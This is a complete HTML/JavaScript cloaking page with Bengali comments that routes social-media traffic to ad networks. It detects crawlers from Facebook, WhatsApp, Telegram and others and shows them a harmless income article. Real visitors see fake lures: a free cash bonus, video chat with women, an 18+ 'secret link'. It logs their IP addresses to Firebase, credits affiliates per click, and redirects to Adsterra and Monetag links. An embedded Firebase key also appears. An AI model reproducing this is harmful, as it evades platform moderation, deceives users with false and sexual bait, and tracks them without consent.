<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Please Wait...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #e2e8f0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: 'Segoe UI', sans-serif; overflow: hidden; margin: 0; }
        
        /* Attractive Fast Loading Spinner */
        .spinner { width: 55px; height: 55px; border: 5px solid rgba(255, 255, 255, 0.1); border-left-color: #fbbf24; border-bottom-color: #f59e0b; border-radius: 50%; animation: spin 0.6s linear infinite; box-shadow: 0 0 15px rgba(245, 158, 11, 0.4); }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Safe Content for Bots */
        #bot-content { display: none; background: white; color: black; padding: 40px; height: 100vh; width: 100vw; text-align: left; font-family: Arial, sans-serif; box-sizing: border-box; }
        
        /* Pulse Animation for Offers */
        .offer-pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(1.05); } }
    </style>
</head>
<body>

    <!-- 🤖 LAYER 1: BOT PROTECTION (সোশ্যাল মিডিয়ার জন্য সেফ) -->
    <div id="bot-content">
        <h1 style="font-size: 28px; color: #1a0dab; font-weight: bold;">Top 10 Online Income Strategies 2024</h1>
        <p style="margin-top: 15px; font-size: 16px; color: #333; line-height: 1.6;">
            The digital world offers numerous opportunities to earn online. From freelancing to affiliate marketing, discover the best ways to build a passive income stream safely.
        </p>
    </div>

    <!-- 🧑 LAYER 2: REAL USER OFFER SCREEN (লোভনীয় স্ক্রিন) -->
    <div id="loader-container" class="flex flex-col items-center text-center px-4">
        <div class="spinner mb-6"></div>
        <!-- 🎯 ডাইনামিক অফার টেক্সট এখানে আসবে -->
        <h2 id="main-offer" class="text-yellow-400 font-bold text-xl md:text-2xl offer-pulse">🎁 অফার চেক করা হচ্ছে...</h2>
        <p id="sub-offer" class="text-green-400 text-sm md:text-base mt-3 font-semibold bg-green-900/30 px-4 py-2 rounded-lg border border-green-700/50">
            দয়া করে অপেক্ষা করুন...
        </p>
    </div>

    <!-- 🧠 FIREBASE & ROUTING LOGIC -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getFirestore, doc, setDoc, increment, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";

        // 🎯 আকর্ষণীয় অফার লিস্ট (সিস্টেম র‍্যান্ডমলি একটা দেখাবে)
        const CLICKBAIT_OFFERS =[
            { main: "💸 একাউন্ট রেডি হচ্ছে...", sub: "পরের পেজে সাইন আপ করলেই ১০০০ টাকা ফ্রি বোনাস!" },
            { main: "😘 ভিডিও চ্যাট আনলক হচ্ছে...", sub: "ফ্রিতে ৩০ জন মেয়ের সাথে ভিডিও চ্যাট করার সুযোগ!" },
            { main: "🎁 স্পেশাল রিওয়ার্ড কনফার্মড!", sub: "অ্যাপটি ইন্সটল করুন এবং সাথে সাথে বোনাস জিতে নিন!" },
            { main: "🔞 সিক্রেট লিংক তৈরি হচ্ছে...", sub: "মাত্র কয়েক সেকেন্ড অপেক্ষা করুন, ফুল এক্সেস পেয়ে যাবেন!" },
            { main: "💎 ভিআইপি অফার লোডিং...", sub: "পরের পেজে আপনার জন্য রয়েছে একটি সারপ্রাইজ গিফট!" }
        ];

        // র‍্যান্ডম অফার সিলেক্ট করে স্ক্রিনে বসানো
        const randomOffer = CLICKBAIT_OFFERS[Math.floor(Math.random() * CLICKBAIT_OFFERS.length)];
        document.getElementById('main-offer').innerText = randomOffer.main;
        document.getElementById('sub-offer').innerText = randomOffer.sub;

        // 🔥 সিস্টেম কনফিগারেশন
        const CONFIG = {
            COOLDOWN_HOURS: 12,     
            MAX_CLICKS: 99999, // ⚠️ টেস্টিংয়ের জন্য আনলিমিটেড (টেস্ট শেষে ২ করে দিবেন)
            TRASH_URL: "https://www.google.com", 
            
            // 🎯 Adsterra ডাইরেক্ট লিংকস
            ADSTERRA_LINKS:[
                "https://brewingeasel.com/exb2js3wf7?key=8dec1fe6817c7208022c2ca0c1282a48",
                "https://brewingeasel.com/ftv2xc7x?key=27c75bb93182e2bb211de9041eb9af29",
                "https://brewingeasel.com/ernsznt05?key=332c0a7f259871b6175edce3ff0158af",
                "https://brewingeasel.com/sbt5ttfmm?key=22887dfac4b92d2faf02e0a7ad7675f4",
                "https://brewingeasel.com/biwhfqzsw?key=81d11cc23b8a94096e0fcb0136f4841e"
            ],
            
            // 🎯 Monetag ডাইরেক্ট লিংকস
            MONETAG_LINKS:[
                "https://omg10.com/4/10842462",
                "https://omg10.com/4/10842461",
                "https://omg10.com/4/7303129",
                "https://omg10.com/4/7303833",
                "https://omg10.com/4/7460253"
            ],

            FIREBASE: { 
                apiKey: "AIzaSyCU2RfLeclEyyxzEActtl5ks1P_NPvATOE", 
                authDomain: "ns-prime-d7ca5.firebaseapp.com",
                projectId: "ns-prime-d7ca5"
            }
        };

        const app = initializeApp(CONFIG.FIREBASE);
        const db = getFirestore(app);
        const params = new URLSearchParams(window.location.search);
        const refCode = params.get('ref') || params.get('u'); 

        // --- 🛡️ সোশ্যাল বট এবং অটোমেশন ব্লক ---
        function isThreat() {
            if (navigator.webdriver) return true; 
            const userAgent = navigator.userAgent.toLowerCase();
            const bots =['facebook', 'whatsapp', 'twitter', 'googlebot', 'telegram', 'discord', 'crawler'];
            return bots.some(bot => userAgent.includes(bot));
        }

        // --- 🚀 মেইন ফাস্ট প্রসেসিং ---
        async function runRouter() {
            if (isThreat()) {
                document.getElementById('loader-container').style.display = 'none';
                document.getElementById('bot-content').style.display = 'block';
                return; 
            }

            const now = Date.now();
            const cooldownMs = CONFIG.COOLDOWN_HOURS * 60 * 60 * 1000;

            let localData = JSON.parse(localStorage.getItem('ad_router')) || { count: 0, time: 0, lastNet: '' };
            if (now - localData.time > cooldownMs) localData = { count: 0, time: now, lastNet: '' };

            if (localData.count >= CONFIG.MAX_CLICKS) {
                window.location.replace(CONFIG.TRASH_URL); 
                return;
            }

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIP = ipData.ip.replace(/\./g, '_'); 

                const ipDocRef = doc(db, "ip_logs", userIP);
                const ipSnap = await getDoc(ipDocRef);
                
                let dbData = ipSnap.exists() ? ipSnap.data() : { count: 0, time: now, lastNet: '' };
                if (now - dbData.time > cooldownMs) dbData = { count: 0, time: now, lastNet: '' };

                if (dbData.count >= CONFIG.MAX_CLICKS) {
                    window.location.replace(CONFIG.TRASH_URL); 
                    return;
                }

                // 🎯 লজিক: Adsterra নাকি Monetag?
                let selectedNet = '';
                if (dbData.count === 0) {
                    selectedNet = Math.random() < 0.5 ? 'adsterra' : 'monetag';
                } else {
                    selectedNet = dbData.lastNet === 'adsterra' ? 'monetag' : 'adsterra';
                }

                let targetUrl = '';
                if (selectedNet === 'adsterra') {
                    targetUrl = CONFIG.ADSTERRA_LINKS[Math.floor(Math.random() * CONFIG.ADSTERRA_LINKS.length)];
                } else {
                    targetUrl = CONFIG.MONETAG_LINKS[Math.floor(Math.random() * CONFIG.MONETAG_LINKS.length)];
                }

                const newCount = dbData.count + 1;
                const saveState = { count: newCount, time: dbData.time, lastNet: selectedNet, ip: ipData.ip };

                localStorage.setItem('ad_router', JSON.stringify(saveState));
                await setDoc(ipDocRef, saveState, { merge: true });

                await trackAffiliateBalance();

                // 🚀 সুপার ফাস্ট রিডাইরেক্ট (১ সেকেন্ড ডিলে দেওয়া হয়েছে যাতে ইউজার লেখাটা অন্তত পড়তে পারে)
                setTimeout(() => {
                    window.location.replace(targetUrl);
                }, 1200);

            } catch (error) {
                console.error("System Error: ", error);
                const fallbackUrl = CONFIG.ADSTERRA_LINKS[Math.floor(Math.random() * CONFIG.ADSTERRA_LINKS.length)];
                setTimeout(() => {
                    window.location.replace(fallbackUrl);
                }, 1200);
            }
        }

        async function trackAffiliateBalance() {
            if(!refCode) return;
            try {
                const [settingsSnap, userSnap] = await Promise.all([
                    getDoc(doc(db, "settings", "config")),
                    getDoc(doc(db, "users", refCode))
                ]);
                let globalCpm = settingsSnap.exists() ? (settingsSnap.data().globalCpm || 0) : 0;
                let userCustomCpm = (userSnap.exists() && userSnap.data().customCpm > 0) ? userSnap.data().customCpm : 0;
                let earning = (userCustomCpm > 0 ? userCustomCpm : globalCpm) / 1000;

                await setDoc(doc(db, "users", refCode), {
                    rawTotalImpressions: increment(1),
                    rawTodayImpressions: increment(1),
                    validClicks: increment(1),
                    balance: increment(earning),
                    todayEarning: increment(earning),
                    totalEarnings: increment(earning),
                    lastActive: serverTimestamp()
                }, { merge: true });
            } catch (e) {
                console.log("Balance Sync Error:", e);
            }
        }

        runRouter();

    </script>
</body>
</html>
